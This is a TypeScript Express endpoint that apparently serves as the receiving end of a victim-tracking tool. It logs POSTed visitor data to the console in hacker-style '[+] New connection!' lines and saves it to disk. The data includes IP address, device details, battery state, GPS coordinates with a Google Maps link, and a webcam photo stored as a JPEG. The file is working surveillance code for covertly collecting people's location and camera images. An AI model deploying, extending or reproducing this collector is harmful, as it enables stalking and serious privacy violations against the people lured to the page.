import "colors";
import "dotenv/config";
import { Request, Response } from "express";
import * as fs from "fs";
import path from "path";
import { DataObjectInterface } from "../../common/types/data-object.interface";

export default async function handler(req: Request, res: Response) {
  if (req.method !== "POST") {
    return res.status(405).end();
  }

  const data: DataObjectInterface = req.body;

  let connectionString = "";

  connectionString += `${"[+]".green} New connection! ${
    `${new Date()}`.yellow
  }\n\n`;
  connectionString += `${"[+]".green} IP: ${data.ip.blue}\n`;
  connectionString += `${"[+]".green} Platform: ${data.platform.blue}\n`;
  connectionString += `${"[+]".green} Languages: ${
    data.languages.join(", ").blue
  }\n`;
  connectionString += `${"[+]".green} Screen Resolution: ${
    data.screenResolution.blue
  }\n`;
  connectionString += `${"[+]".green} Timezone: ${data.timezone.blue}\n`;
  connectionString += `${"[+]".green} CPU Cores: ${
    data.cpuCores?.toString().blue
  }\n`;
  connectionString += `${"[+]".green} RAM: ${data.ram?.toString().blue}\n`;
  connectionString += `${"[+]".green} Battery charging?: ${
    data.batteryInfo.charging?.toString().blue
  }\n`;
  connectionString += `${"[+]".green} Time left to charge: ${
    `${data.batteryInfo?.chargingTime}s`.blue
  }\n`;
  connectionString += `${"[+]".green} Time left to discharge: ${
    `${data.batteryInfo?.dischargingTime}s`.blue
  }\n`;
  connectionString += `${"[+]".green} Battery level: ${
    `≈ ${(data.batteryInfo?.level * 100).toFixed(1)}%`.blue
  }\n\n`;
  connectionString += `${"[+]".green} Browser Version: ${
    data.browserVersion.blue
  }\n\n`;
  connectionString += `${"[+]".green} Latitude: ${
    data.position.latidute
      ? data.position.latidute.toString().blue
      : "null".gray
  }\n`;
  connectionString += `${"[+]".green} Longtide: ${
    data.position.longitude
      ? data.position.longitude.toString().blue
      : "null".gray
  }\n`;
  connectionString += `${"[+]".green} Google maps link: ${
    data.position.googleMaps
      ? data.position.googleMaps.toString().blue
      : "null".gray
  }\n`;
  connectionString += `${"[+]".green} Accuracy: ${
    data.position.accuracy
      ? `${data.position.accuracy.toString()}m`.blue
      : "null".gray
  }\n\n`;

  const photoName = Date.now().toString();

  connectionString += `${"[+]".green} ${
    data.webcamPhoto
      ? `Webcam photo saved in /common/data/images/${photoName}.jpg`.blue
      : "User denied webcam permission".gray
  }\n`;

  console.log(connectionString);

  fs.appendFile(
    path.join(__dirname, "../../../..", "common", "data", "data.txt"),
    connectionString,
    (err) => {
      if (err) {
        console.error("Error appending data to file:", err);
      } else {
        console.log(
          `${"[+]".green} ${"Data saved to file successfully!".blue}\n`
        );
      }
    }
  );

  if (data.webcamPhoto) {
    const base64Image = data.webcamPhoto.replace(
      /^data:image\/jpeg;base64,/,
      ""
    );

    const imageBuffer = Buffer.from(base64Image, "base64");

    fs.writeFile(
      path.join(
        __dirname,
        "../../../..",
        "common",
        "data",
        "images",
        `${photoName}.jpg`
      ),
      imageBuffer,
      (err) => {
        if (err) {
          console.error(`Error while saving file ${photoName}: `, err);
        }
      }
    );
  }

  res.status(200).json({});
}
